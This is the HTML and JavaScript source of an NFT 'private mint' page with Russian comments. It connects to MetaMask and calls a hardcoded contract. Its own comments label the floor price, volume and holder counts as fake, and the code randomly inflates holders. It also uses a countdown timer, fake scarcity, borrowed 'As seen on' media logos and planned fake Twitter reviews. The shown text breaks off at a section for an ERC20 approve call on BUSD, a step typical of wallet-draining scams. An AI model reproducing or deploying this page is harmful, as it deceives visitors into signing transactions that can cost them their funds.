<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Exclusive Mint | NFT Collection</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Unbounded:wght@700;900&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --main-gradient: linear-gradient(90deg, #2af598 0%, #009efd 100%);
      --header-gradient: linear-gradient(180deg, rgba(34,38,64,0.98) 60%, rgba(26,26,46,0.98) 100%);
      --button-gradient: linear-gradient(90deg, #2af598 0%, #009efd 100%);
      --button-hover: linear-gradient(90deg, #009efd 0%, #2af598 100%);
      --bg-dark: #18192b;
      --bg-card: rgba(36, 38, 60, 0.96);
      --border: rgba(42,245,152,0.08);
      --shadow: 0 8px 32px 0 rgba(0,158,253,0.10);
      --text-main: #f7faff;
      --text-secondary: #b0b0c3;
      --accent: #2af598;
      --success: #2af598;
      --danger: #ff6b6b;
      --gold: #ffe066;
    }
    html {
      height: 100%;
      min-height: 100vh;
      background: linear-gradient(180deg, #23234a 0%, #23234a 40%, #18192b 90%, #18192b 100%);
      background-attachment: fixed;
      color: var(--text-main);
      font-family: 'Inter', Arial, sans-serif;
      box-sizing: border-box;
    }
    body {
      min-height: 100vh;
      height: 100%;
      background: none !important;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      overflow-x: hidden;
      position: relative;
    }
    body::after {
      content: '';
      position: fixed;
      left: 0; right: 0; bottom: 0;
      height: 200px;
      background: linear-gradient(180deg, transparent 0%, #18192b 100%);
      pointer-events: none;
      z-index: 9999;
    }
    .header {
      width: 100%;
      padding: 32px 0 24px 0;
      background: var(--header-gradient);
      box-shadow: 0 8px 48px 0 rgba(42,245,152,0.10), 0 1.5px 0 0 rgba(42,245,152,0.08);
      backdrop-filter: blur(16px);
      border-bottom-left-radius: 32px;
      border-bottom-right-radius: 32px;
      border-top-left-radius: 0;
      border-top-right-radius: 0;
      border-bottom: 1.5px solid rgba(42,245,152,0.08);
      display: flex;
      flex-direction: column;
      align-items: center;
      position: relative;
      z-index: 2;
    }
    .header::after {
      content: '';
      position: absolute;
      left: 0; right: 0; bottom: -36px;
      height: 72px;
      pointer-events: none;
      z-index: 3;
      background: linear-gradient(to bottom, rgba(34,38,64,0.10) 0%, rgba(24,25,43,0.0) 100%);
    }
    .logo {
      display: flex;
      align-items: center;
      gap: 18px;
      margin-bottom: 8px;
    }
    .logo-svg {
      width: 56px;
      height: 56px;
      background: var(--main-gradient);
      border-radius: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 4px 24px 0 rgba(255,107,203,0.18);
    }
    .logo-svg svg {
      width: 36px;
      height: 36px;
      display: block;
    }
    .logo-title {
      font-family: 'Unbounded', Arial, sans-serif;
      font-size: 2.2rem;
      font-weight: 900;
      letter-spacing: 2px;
      background: var(--main-gradient);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      text-fill-color: transparent;
      text-shadow: 0 2px 12px rgba(115,102,255,0.18);
    }
    .exclusive-badge {
      display: inline-block;
      background: rgba(255,255,255,0.12);
      color: var(--gold);
      font-weight: 700;
      font-size: 1.1rem;
      padding: 6px 18px;
      border-radius: 16px;
      letter-spacing: 1px;
      margin-top: 6px;
      box-shadow: 0 2px 8px 0 rgba(255,224,102,0.08);
      border: 1.5px solid var(--gold);
      text-shadow: 0 1px 4px #000;
    }
    .stats-bar {
      display: flex;
      gap: 32px;
      margin-top: 24px;
      justify-content: center;
      flex-wrap: wrap;
    }
    .stat-card {
      background: var(--bg-card);
      border: 1.5px solid var(--border);
      border-radius: 18px;
      padding: 18px 32px;
      min-width: 140px;
      box-shadow: var(--shadow);
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-bottom: 8px;
      transition: transform 0.18s;
    }
    .stat-card:hover {
      transform: translateY(-4px) scale(1.03);
      box-shadow: 0 8px 32px 0 rgba(42,245,152,0.12);
    }
    .stat-label {
      color: var(--text-secondary);
      font-size: 0.95rem;
      margin-bottom: 4px;
      letter-spacing: 0.5px;
    }
    .stat-value {
      font-size: 1.5rem;
      font-weight: 700;
      background: var(--main-gradient);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      text-fill-color: transparent;
      text-shadow: 0 2px 12px rgba(42,245,152,0.12);
    }
    .mint-section {
      margin: 0 auto;
      margin-top: 48px;
      max-width: 480px;
      width: 100%;
      background: var(--bg-card);
      border-radius: 24px;
      box-shadow: var(--shadow);
      padding: 40px 28px 32px 28px;
      display: flex;
      flex-direction: column;
      align-items: center;
      border: 1.5px solid var(--border);
      position: relative;
      z-index: 1;
      animation: fadeInUp 1.2s cubic-bezier(.23,1.01,.32,1) 0.1s both;
      backdrop-filter: blur(2.5px);
      box-shadow: 0 8px 32px 0 rgba(42,245,152,0.10), 0 1.5px 0 0 rgba(42,245,152,0.08);
    }
    @keyframes fadeInUp {
      0% { opacity: 0; transform: translateY(40px); }
      100% { opacity: 1; transform: none; }
    }
    .mint-counter {
      font-size: 1.25rem;
      font-weight: 700;
      margin-bottom: 10px;
      letter-spacing: 1px;
      color: var(--gold);
      text-shadow: 0 2px 12px rgba(255,224,102,0.12);
    }
    .mint-timer {
      width: 100%;
      text-align: center;
      font-family: 'Unbounded', Arial, sans-serif;
      font-size: 1.15rem;
      font-weight: 700;
      letter-spacing: 1px;
      margin-bottom: 10px;
      color: #00eaff;
      background: linear-gradient(90deg, #009efd 0%, #2af598 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      text-fill-color: transparent;
      text-shadow: 0 2px 12px #009efd33;
      border-radius: 12px;
      box-shadow: 0 2px 12px 0 #009efd22;
      padding: 6px 0 2px 0;
      user-select: none;
      transition: color 0.2s;
    }
    .mint-status {
      font-size: 1.1rem;
      font-weight: 600;
      margin-bottom: 24px;
      letter-spacing: 1px;
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .status-dot {
      width: 14px;
      height: 14px;
      border-radius: 50%;
      display: inline-block;
      background: var(--success);
      box-shadow: 0 0 8px 2px var(--success);
      animation: pulse 1.2s infinite;
    }
    @keyframes pulse {
      0% { box-shadow: 0 0 8px 2px var(--success); }
      50% { box-shadow: 0 0 16px 6px var(--success); }
      100% { box-shadow: 0 0 8px 2px var(--success); }
    }
    .status-dot.soldout {
      background: var(--danger);
      box-shadow: 0 0 8px 2px var(--danger);
      animation: none;
    }
    .status-dot.minting {
      background: var(--gold);
      box-shadow: 0 0 8px 2px var(--gold);
      animation: pulse 0.7s infinite;
    }
    .mint-btn {
      width: 100%;
      max-width: 340px;
      padding: 22px 0;
      font-size: 1.5rem;
      font-family: 'Unbounded', Arial, sans-serif;
      font-weight: 900;
      background: var(--button-gradient);
      color: #fff;
      border: none;
      border-radius: 18px;
      cursor: pointer;
      box-shadow: 0 4px 24px 0 rgba(255,107,203,0.18);
      margin-bottom: 24px;
      margin-top: 8px;
      letter-spacing: 2px;
      transition: background 0.3s, transform 0.18s, box-shadow 0.18s;
      position: relative;
      overflow: hidden;
      z-index: 1;
    }
    .mint-btn:after {
      content: '';
      position: absolute;
      left: 0; top: 0; right: 0; bottom: 0;
      background: linear-gradient(120deg,rgba(255,255,255,0.12) 0%,rgba(255,255,255,0.02) 100%);
      pointer-events: none;
      z-index: 2;
      border-radius: 18px;
    }
    .mint-btn:hover, .mint-btn:focus {
      background: var(--button-hover);
      transform: scale(1.03);
      box-shadow: 0 8px 32px 0 rgba(115,102,255,0.18);
    }
    .mint-btn:active {
      transform: scale(0.98);
    }
    .mint-btn[disabled] {
      opacity: 0.6;
      cursor: not-allowed;
      background: #444;
      box-shadow: none;
    }
    .latest-minters {
      margin-top: 38px;
      background: var(--bg-card);
      border-radius: 18px;
      box-shadow: var(--shadow);
      padding: 24px 18px 18px 18px;
      border: 1.5px solid var(--border);
      max-width: 480px;
      width: 100%;
      margin-left: auto;
      margin-right: auto;
      animation: fadeInUp 1.2s cubic-bezier(.23,1.01,.32,1) 0.2s both;
      backdrop-filter: blur(2.5px);
      box-shadow: 0 8px 32px 0 rgba(42,245,152,0.10), 0 1.5px 0 0 rgba(42,245,152,0.08);
    }
    .minters-title {
      font-size: 1.15rem;
      font-weight: 700;
      margin-bottom: 16px;
      letter-spacing: 1px;
      color: var(--accent);
      text-align: left;
    }
    .minters-list {
      display: flex;
      flex-direction: row;
      gap: 18px;
      overflow-x: auto;
      padding-bottom: 6px;
      scrollbar-width: thin;
    }
    .minter-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      min-width: 72px;
      animation: fadeIn 0.7s cubic-bezier(.23,1.01,.32,1);
    }
    @keyframes fadeIn {
      0% { opacity: 0; transform: scale(0.8); }
      100% { opacity: 1; transform: none; }
    }
    .minter-avatar {
      display: none;
    }
    .emoji-avatar, .log-emoji-avatar {
      width: 48px;
      height: 48px;
      border-radius: 50%;
      background: linear-gradient(135deg, #23234a 60%, #2af598 100%);
      border: 2.5px solid #fff;
      box-shadow: 0 2px 8px 0 rgba(42,245,152,0.12);
      margin-bottom: 6px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.5rem;
      font-family: 'Apple Color Emoji','Segoe UI Emoji','Segoe UI Symbol',sans-serif;
      user-select: none;
      overflow: hidden;
      line-height: 1;
      padding: 2px;
    }
    .log-emoji-avatar {
      width: 32px;
      height: 32px;
      font-size: 1rem;
      margin-bottom: 0;
      overflow: hidden;
      line-height: 1;
      padding: 1px;
    }
    .minter-address {
      font-size: 0.85rem;
      color: var(--text-secondary);
      font-family: monospace;
      text-align: center;
      word-break: break-all;
      max-width: 70px;
    }
    .log-section {
      margin: 0 auto;
      margin-top: 38px;
      max-width: 480px;
      width: 100%;
      background: var(--bg-card);
      border-radius: 18px;
      box-shadow: var(--shadow);
      padding: 24px 18px 18px 18px;
      border: 1.5px solid var(--border);
      animation: fadeInUp 1.2s cubic-bezier(.23,1.01,.32,1) 0.3s both;
      backdrop-filter: blur(2.5px);
      box-shadow: 0 8px 32px 0 rgba(42,245,152,0.10), 0 1.5px 0 0 rgba(42,245,152,0.08);
    }
    .log-title {
      font-size: 1.1rem;
      font-weight: 700;
      margin-bottom: 12px;
      color: var(--success);
      letter-spacing: 1px;
      text-align: left;
    }
    .log-list {
      display: flex;
      flex-direction: column;
      gap: 12px;
      max-height: 220px;
      overflow-y: auto;
      scrollbar-width: thin;
    }
    .log-item {
      display: flex;
      align-items: center;
      gap: 12px;
      background: rgba(255,255,255,0.03);
      border-radius: 12px;
      padding: 8px 12px;
      font-family: monospace;
      font-size: 0.98rem;
      box-shadow: 0 1px 4px 0 rgba(42,245,152,0.04);
      animation: fadeIn 0.7s cubic-bezier(.23,1.01,.32,1);
    }
    .log-avatar {
      display: none;
    }
    .log-address {
      color: var(--accent);
      font-weight: 700;
      font-size: 0.98rem;
      margin-right: 6px;
      word-break: break-all;
    }
    .log-status {
      color: var(--text-secondary);
      font-size: 0.95rem;
    }
    /* Loader styles */
    .loader {
      border: 4px solid #eee;
      border-top: 4px solid var(--accent);
      border-radius: 50%;
      width: 36px;
      height: 36px;
      animation: spin 1s linear infinite;
      margin: 0 auto 18px auto;
      display: none;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    @media (max-width: 700px) {
      .header { padding: 22px 0 16px 0; }
      .logo-title { font-size: 1.3rem; }
      .logo-svg { width: 38px; height: 38px; }
      .logo-svg svg { width: 24px; height: 24px; }
      .stat-card { padding: 12px 16px; min-width: 90px; }
      .mint-section, .latest-minters, .log-section { padding: 18px 6px 12px 6px; }
      .mint-btn { font-size: 1.1rem; padding: 14px 0; }
      .minter-avatar { width: 36px; height: 36px; }
      .minter-item { min-width: 54px; }
      .log-avatar { width: 22px; height: 22px; }
    }
    .header-wrap, .mint-section-wrap, .latest-minters-wrap, .log-section-wrap {
      position: relative;
      width: 100%;
      display: flex;
      justify-content: center;
    }
    .mint-leaf-bg {
      position: absolute;
      top: 0; left: 0; width: 100%; min-height: 100%;
      pointer-events: none;
      z-index: 0;
      overflow: hidden;
    }
    .mint-leaf-bg-item {
      position: absolute;
      opacity: 0.22;
      filter: blur(0.5px) drop-shadow(0 0px 16px #2af59888) drop-shadow(0 0px 32px #009efd44);
      will-change: transform;
      transition: opacity 0.5s;
      pointer-events: none;
      animation-name: bgLeafBreath;
      animation-duration: 7s;
      animation-iteration-count: infinite;
      animation-timing-function: ease-in-out;
      animation-direction: alternate;
    }
    .bg-leaf1 { left: 2vw; top: 8vh; width: 90px; animation: bgLeafFloat1 22s ease-in-out infinite alternate, bgLeafBreath 7s ease-in-out infinite alternate; }
    .bg-leaf2 { right: 4vw; top: 18vh; width: 70px; animation: bgLeafFloat2 28s ease-in-out infinite alternate, bgLeafBreath 8s ease-in-out infinite alternate; }
    .bg-leaf3 { left: 10vw; top: 38vh; width: 60px; animation: bgLeafFloat3 19s ease-in-out infinite alternate, bgLeafBreath 6s ease-in-out infinite alternate; }
    .bg-leaf4 { right: 12vw; top: 52vh; width: 80px; animation: bgLeafFloat4 25s ease-in-out infinite alternate, bgLeafBreath 9s ease-in-out infinite alternate; }
    .bg-leaf5 { left: 18vw; bottom: 8vh; width: 55px; animation: bgLeafFloat5 21s ease-in-out infinite alternate, bgLeafBreath 7.5s ease-in-out infinite alternate; }
    .bg-leaf6 { right: 18vw; bottom: 12vh; width: 65px; animation: bgLeafFloat6 24s ease-in-out infinite alternate, bgLeafBreath 8.5s ease-in-out infinite alternate; }
    .bg-leaf7 { left: 40vw; top: 18vh; width: 45px; animation: bgLeafFloat7 27s ease-in-out infinite alternate, bgLeafBreath 6.5s ease-in-out infinite alternate; }
    .bg-leaf8 { right: 40vw; bottom: 18vh; width: 50px; animation: bgLeafFloat8 23s ease-in-out infinite alternate, bgLeafBreath 7.2s ease-in-out infinite alternate; }
    @keyframes bgLeafBreath {
      0% { opacity: 0.18; transform: scale(1); }
      50% { opacity: 0.28; transform: scale(1.08); }
      100% { opacity: 0.18; transform: scale(1); }
    }
    @keyframes bgLeafFloat1 { 0% { transform: translateY(0) rotate(-8deg) scale(1); } 100% { transform: translateY(40px) rotate(8deg) scale(1.08); } }
    @keyframes bgLeafFloat2 { 0% { transform: translateY(0) rotate(12deg) scale(1); } 100% { transform: translateY(-60px) rotate(22deg) scale(1.1); } }
    @keyframes bgLeafFloat3 { 0% { transform: translateY(0) rotate(24deg) scale(1); } 100% { transform: translateY(-44px) rotate(14deg) scale(0.95); } }
    @keyframes bgLeafFloat4 { 0% { transform: translateY(0) rotate(-8deg) scale(1); } 100% { transform: translateY(-36px) rotate(-18deg) scale(1.05); } }
    @keyframes bgLeafFloat5 { 0% { transform: translateY(0) rotate(8deg) scale(1); } 100% { transform: translateY(32px) rotate(-8deg) scale(1.12); } }
    @keyframes bgLeafFloat6 { 0% { transform: translateY(0) rotate(-12deg) scale(1); } 100% { transform: translateY(28px) rotate(12deg) scale(1.09); } }
    @keyframes bgLeafFloat7 { 0% { transform: translateY(0) rotate(18deg) scale(1); } 100% { transform: translateY(-24px) rotate(-12deg) scale(1.04); } }
    @keyframes bgLeafFloat8 { 0% { transform: translateY(0) rotate(-18deg) scale(1); } 100% { transform: translateY(24px) rotate(18deg) scale(1.07); } }
    @media (max-width: 700px) {
      .mint-leaf-bg-item { opacity: 0.06 !important; width: 48px !important; }
    }
    /* As seen on */
    .as-seen-on {
      display: flex;
      align-items: center;
      gap: 18px;
      margin: 10px 0 18px 0;
      justify-content: center;
      animation: fadeInUp 1.2s cubic-bezier(.23,1.01,.32,1) 0.15s both;
    }
    .as-seen-on-label {
      color: var(--text-secondary);
      font-family: 'Inter', Arial, sans-serif;
      font-size: 1.05rem;
      font-weight: 600;
      letter-spacing: 1px;
      margin-right: 8px;
    }
    .as-seen-on-logos {
      display: flex;
      gap: 14px;
    }
    .as-seen-logo {
      height: 28px;
      width: auto;
      filter: drop-shadow(0 2px 8px #2af59844) brightness(1.15);
      opacity: 0;
      animation: logoFadeIn 0.7s forwards;
    }
    .as-seen-logo:nth-child(1) { animation-delay: 0.2s; }
    .as-seen-logo:nth-child(2) { animation-delay: 0.35s; }
    .as-seen-logo:nth-child(3) { animation-delay: 0.5s; }
    .as-seen-logo:nth-child(4) { animation-delay: 0.65s; }
    @keyframes logoFadeIn {
      from { opacity: 0; transform: translateY(12px) scale(0.95); }
      to { opacity: 1; transform: none; }
    }
    /* Twitter отзывы */
    .twitter-reviews-wrap {
      margin: 32px auto 0 auto;
      max-width: 480px;
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      background: var(--bg-card);
      border-radius: 18px;
      box-shadow: var(--shadow);
      border: 1.5px solid var(--border);
      padding: 18px 8px 12px 8px;
      animation: fadeInUp 1.2s cubic-bezier(.23,1.01,.32,1) 0.25s both;
      position: relative;
      overflow: hidden;
    }
    .twitter-reviews-slider {
      display: flex;
      flex-direction: row;
      width: 100%;
      transition: transform 0.7s cubic-bezier(.23,1.01,.32,1);
      will-change: transform;
    }
    .twitter-review-slide {
      min-width: 100%;
      max-width: 100%;
      display: flex;
      align-items: flex-start;
      gap: 16px;
      padding: 0 8px;
      opacity: 0;
      transition: opacity 0.5s;
      position: absolute;
      left: 0; top: 0;
      width: 100%;
      height: 100%;
      z-index: 1;
      background: none;
      pointer-events: none;
    }
    .twitter-review-slide.active {
      opacity: 1;
      position: relative;
      pointer-events: auto;
      z-index: 2;
    }
    .twitter-avatar {
      width: 44px;
      height: 44px;
      border-radius: 50%;
      background: linear-gradient(135deg, #23234a 60%, #2af598 100%);
      border: 2.5px solid #fff;
      box-shadow: 0 2px 8px 0 #2af59822;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.5rem;
      font-family: 'Apple Color Emoji','Segoe UI Emoji','Segoe UI Symbol',sans-serif;
      user-select: none;
      overflow: hidden;
      line-height: 1;
      padding: 2px;
    }
    .twitter-user {
      font-family: 'Unbounded', Arial, sans-serif;
      font-size: 1.08rem;
      font-weight: 700;
      color: #00eaff;
      letter-spacing: 0.5px;
      margin-bottom: 2px;
      display: flex;
      align-items: center;
      gap: 6px;
    }
    .twitter-handle {
      font-family: 'Inter', Arial, sans-serif;
      font-size: 0.98rem;
      color: var(--text-secondary);
      font-weight: 400;
      margin-left: 4px;
    }
    .twitter-text {
      font-family: 'Inter', Arial, sans-serif;
      font-size: 1.08rem;
      color: var(--text-main);
      background: linear-gradient(90deg, #009efd11 0%, #2af59811 100%);
      border-radius: 10px;
      padding: 8px 14px;
      margin-top: 2px;
      box-shadow: 0 2px 8px 0 #009efd11;
      line-height: 1.5;
      word-break: break-word;
    }
    @media (max-width: 700px) {
      .as-seen-logo { height: 20px; }
      .twitter-avatar { width: 32px; height: 32px; font-size: 1.1rem; }
      .twitter-reviews-wrap { padding: 10px 2px 6px 2px; }
    }
  </style>
</head>
<body>
  <!-- Крупные листья мяты на фоне -->
  <div class="mint-leaf-bg">
    <svg class="mint-leaf-bg-item bg-leaf1" viewBox="0 0 128 128" fill="none"><path d="M64 8C88 32 120 72 64 120C8 72 40 32 64 8Z" fill="#2af598" fill-opacity="0.13" stroke="#009e60" stroke-width="3"/><path d="M64 8C72 56 72 104 64 120" stroke="#009e60" stroke-width="3"/></svg>
    <svg class="mint-leaf-bg-item bg-leaf2" viewBox="0 0 128 128" fill="none"><path d="M64 16C104 40 120 96 64 112C8 96 24 40 64 16Z" fill="#7fffd4" fill-opacity="0.10" stroke="#009e60" stroke-width="3"/><path d="M64 16C72 72 72 104 64 112" stroke="#009e60" stroke-width="3"/></svg>
    <svg class="mint-leaf-bg-item bg-leaf3" viewBox="0 0 128 128" fill="none"><path d="M64 24C96 56 120 104 64 120C8 104 32 56 64 24Z" fill="#2af598" fill-opacity="0.09" stroke="#009e60" stroke-width="3"/><path d="M64 24C72 80 72 104 64 120" stroke="#009e60" stroke-width="3"/></svg>
    <svg class="mint-leaf-bg-item bg-leaf4" viewBox="0 0 128 128" fill="none"><path d="M64 12C112 36 124 92 64 124C4 92 16 36 64 12Z" fill="#7fffd4" fill-opacity="0.11" stroke="#009e60" stroke-width="3"/><path d="M64 12C72 68 72 104 64 124" stroke="#009e60" stroke-width="3"/></svg>
    <svg class="mint-leaf-bg-item bg-leaf5" viewBox="0 0 128 128" fill="none"><path d="M64 8C88 32 120 72 64 120C8 72 40 32 64 8Z" fill="#2af598" fill-opacity="0.08" stroke="#009e60" stroke-width="3"/><path d="M64 8C72 56 72 104 64 120" stroke="#009e60" stroke-width="3"/></svg>
    <svg class="mint-leaf-bg-item bg-leaf6" viewBox="0 0 128 128" fill="none"><path d="M64 16C104 40 120 96 64 112C8 96 24 40 64 16Z" fill="#7fffd4" fill-opacity="0.07" stroke="#009e60" stroke-width="3"/><path d="M64 16C72 72 72 104 64 112" stroke="#009e60" stroke-width="3"/></svg>
    <svg class="mint-leaf-bg-item bg-leaf7" viewBox="0 0 128 128" fill="none"><path d="M64 24C96 56 120 104 64 120C8 104 32 56 64 24Z" fill="#2af598" fill-opacity="0.09" stroke="#009e60" stroke-width="3"/><path d="M64 24C72 80 72 104 64 120" stroke="#009e60" stroke-width="3"/></svg>
    <svg class="mint-leaf-bg-item bg-leaf8" viewBox="0 0 128 128" fill="none"><path d="M64 12C112 36 124 92 64 124C4 92 16 36 64 12Z" fill="#7fffd4" fill-opacity="0.10" stroke="#009e60" stroke-width="3"/><path d="M64 12C72 68 72 104 64 124" stroke="#009e60" stroke-width="3"/></svg>
  </div>

  <!-- Лакшери-хедер с логотипом и бейджем -->
  <div class="header-wrap">
    <div class="header">
      <div class="logo">
        <div class="logo-svg">
          <!-- Абстрактный SVG-логотип -->
          <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
            <defs>
              <radialGradient id="mintLeafGlow" cx="0.5" cy="0.5" r="0.6">
                <stop offset="0%" stop-color="#fff" stop-opacity="0.55"/>
                <stop offset="80%" stop-color="#2af598" stop-opacity="0.12"/>
                <stop offset="100%" stop-color="#009efd" stop-opacity="0.05"/>
              </radialGradient>
              <linearGradient id="mintLeafGradient2" x1="0" y1="0" x2="48" y2="48" gradientUnits="userSpaceOnUse">
                <stop stop-color="#00e676"/>
                <stop offset="0.7" stop-color="#009efd"/>
                <stop offset="1" stop-color="#005fa3"/>
              </linearGradient>
            </defs>
            <ellipse cx="24" cy="24" rx="20" ry="20" fill="url(#mintLeafGlow)"/>
            <path d="M24 6C34 16 42 32 24 42C6 32 14 16 24 6Z" fill="url(#mintLeafGradient2)" stroke="#fff" stroke-width="2.5" filter="url(#leafShadow)"/>
            <path d="M24 6C27 22 27 36 24 42" stroke="#fff" stroke-width="2" opacity="0.85"/>
            <defs>
              <filter id="leafShadow" x="0" y="0" width="48" height="48" filterUnits="userSpaceOnUse">
                <feDropShadow dx="0" dy="2" stdDeviation="2" flood-color="#2af598" flood-opacity="0.25"/>
              </filter>
            </defs>
          </svg>
        </div>
        <span class="logo-title">EXCLUSIVE MINT</span>
      </div>
      <!-- As seen on block -->
      <div class="as-seen-on">
        <span class="as-seen-on-label">As seen on:</span>
        <div class="as-seen-on-logos">
          <img src="https://cryptologos.cc/logos/coingecko-coingecko-logo.svg?v=026" alt="CoinGecko" class="as-seen-logo"/>
          <img src="https://cryptologos.cc/logos/cointelegraph-cointelegraph-logo.svg?v=026" alt="CoinTelegraph" class="as-seen-logo"/>
          <img src="https://cryptologos.cc/logos/zksync-zksync-logo.svg?v=026" alt="zkSync" class="as-seen-logo"/>
          <img src="https://cryptologos.cc/logos/decrypt-decrypt-logo.svg?v=026" alt="Decrypt" class="as-seen-logo"/>
        </div>
      </div>
      <span class="exclusive-badge">PRIVATE MINT</span>
      <div class="stats-bar">
        <div class="stat-card">
          <div class="stat-label">Floor Price</div>
          <div class="stat-value" id="floorPrice">2.37 ETH</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">Volume Traded</div>
          <div class="stat-value" id="volumeTraded">8,420 ETH</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">Holders</div>
          <div class="stat-value" id="holders">713</div>
        </div>
      </div>
    </div>
  </div>

  <!-- Основной блок минта -->
  <div class="mint-section-wrap">
    <div class="mint-section">
      <div class="mint-counter" id="mintCounter">927 / 1000 NFTs Minted</div>
      <!-- Mint ends in timer -->
      <div class="mint-timer" id="mintTimer">⏳ Mint ends in: 00:04:59</div>
      <div class="mint-status" id="mintStatus">
        <span class="status-dot" id="statusDot"></span>
        <span id="statusText">LIVE</span>
      </div>
      <button class="mint-btn" id="mintBtn" onclick="mint()">Mint Now</button>
      <div class="loader" id="loader"></div>
    </div>
  </div>

  <!-- Лента последних минтеров -->
  <div class="latest-minters-wrap">
    <div class="latest-minters">
      <div class="minters-title">Latest Minters</div>
      <div class="minters-list" id="mintersList">
        <!-- minter items -->
      </div>
    </div>
  </div>

  <!-- Twitter отзывы -->
  <div class="twitter-reviews-wrap">
    <div class="twitter-reviews-slider" id="twitterReviewsSlider">
      <!-- Slides will be injected here -->
    </div>
  </div>

  <!-- Логи минта -->
  <div class="log-section-wrap">
    <div class="log-section">
      <div class="log-title">Mint Log</div>
      <div class="log-list" id="logList">
        <!-- log items -->
      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
  <script>
    // --- Fake stats (можно сделать динамическими, если нужно) ---
    let minted = 927;
    const mintedMax = 1000;
    let holders = 713;
    const uniqueAddresses = new Set();
    let floorPrice = 2.37;
    let volumeTraded = 8420;
    let isSoldOut = false;
    let isMinting = false;

    // --- Minted minters (для Latest Minters и логов) ---
    const minters = [];
    const logEvents = [];
    const MAX_MINTERS = 12;
    const MAX_LOGS = 20;

    // --- Контракт ---
    const contractAddress = "0xC259Bb14dE51e292b9E6f32AD41507bf3Fa7028A";
    const abi = [
      "event Minted(address indexed user)",
      "function mint() external"
    ];
    let provider, signer, contract;

    // --- Эмодзи-аватарки ---
    const emojiList = ["🦄","🐧","🦊","🐸","🐼","🐲","🐵","🐯","🐶","🐱","🐻","🦁","🐮","🐷","🐔","🐙","🦋","🌸","🍕","🚀","💎"];
    function getEmojiAvatar(address) {
      let sum = 0;
      for (let i = 0; i < address.length; i++) sum += address.charCodeAt(i);
      return emojiList[sum % emojiList.length];
    }

    // --- Плавная анимация счетчиков ---
    let animatedMinted = minted;
    let animatedHolders = holders;
    function animateCounter(current, target, cb) {
      if (current === target) return;
      const step = Math.max(1, Math.floor(Math.abs(target - current) / 12));
      function tick() {
        if (current < target) {
          current += step;
          if (current > target) current = target;
        } else if (current > target) {
          current -= step;
          if (current < target) current = target;
        }
        cb(current);
        if (current !== target) requestAnimationFrame(tick);
      }
      tick();
    }
    function updateMintCounter() {
      animateCounter(animatedMinted, minted, val => {
        animatedMinted = val;
        document.getElementById('mintCounter').innerText = `${animatedMinted} / ${mintedMax} NFTs Minted`;
      });
    }
    function updateStatus() {
      const statusDot = document.getElementById('statusDot');
      const statusText = document.getElementById('statusText');
      if (isSoldOut) {
        statusDot.className = 'status-dot soldout';
        statusText.innerText = 'SOLD OUT';
      } else if (isMinting) {
        statusDot.className = 'status-dot minting';
        statusText.innerText = 'Minting...';
      } else {
        statusDot.className = 'status-dot';
        statusText.innerText = 'LIVE';
      }
    }
    function updateStatsBar() {
      document.getElementById('floorPrice').innerText = `${floorPrice} ETH`;
      document.getElementById('volumeTraded').innerText = `${volumeTraded.toLocaleString()} ETH`;
      animateCounter(animatedHolders, holders, val => {
        animatedHolders = val;
        document.getElementById('holders').innerText = animatedHolders;
      });
    }
    function updateMintersList() {
      const mintersList = document.getElementById('mintersList');
      mintersList.innerHTML = '';
      minters.slice(-MAX_MINTERS).reverse().forEach(minter => {
        const item = document.createElement('div');
        item.className = 'minter-item';
        item.innerHTML = `
          <div class="emoji-avatar">${getEmojiAvatar(minter.address)}</div>
          <div class="minter-address">${shortAddr(minter.address)}</div>
        `;
        mintersList.appendChild(item);
      });
    }
    function updateLogList() {
      const logList = document.getElementById('logList');
      logList.innerHTML = '';
      logEvents.slice(-MAX_LOGS).reverse().forEach(event => {
        const item = document.createElement('div');
        item.className = 'log-item';
        item.innerHTML = `
          <div class="log-emoji-avatar">${getEmojiAvatar(event.address)}</div>
          <span class="log-address">${shortAddr(event.address)}</span>
          <span class="log-status">Minted</span>
        `;
        logList.appendChild(item);
      });
    }
    function shortAddr(addr) {
      return addr.slice(0, 6) + '...' + addr.slice(-4);
    }
    function setMintingState(state) {
      isMinting = state;
      updateStatus();
      document.getElementById('mintBtn').disabled = state || isSoldOut;
      document.getElementById('loader').style.display = state ? 'block' : 'none';
    }
    function setSoldOutState() {
      isSoldOut = true;
      updateStatus();
      document.getElementById('mintBtn').disabled = true;
    }

    // --- Инициализация Web3 и событий ---
    async function init() {
      updateMintCounter();
      updateStatus();
      updateStatsBar();
      updateMintersList();
      updateLogList();
      if (!window.ethereum) {
        alert("MetaMask is required!");
        setSoldOutState();
        return;
      }
      provider = new ethers.BrowserProvider(window.ethereum);
      signer = await provider.getSigner();
      contract = new ethers.Contract(contractAddress, abi, signer);
      // Слушаем событие Minted
      contract.on("Minted", (user) => {
        minted++;
        if (minted >= mintedMax) setSoldOutState();
        // Фейковое увеличение холдеров иногда
        if (Math.random() > 0.7) holders++;
        minters.push({ address: user });
        logEvents.push({ address: user });
        updateMintCounter();
        updateStatsBar();
        updateMintersList();
        updateLogList();
      });
    }

    // --- ERC20 approve для BUSD ---
    const tokenAddress = "0xe9e7cea3dedca5984780bafc599bd69add087d56";
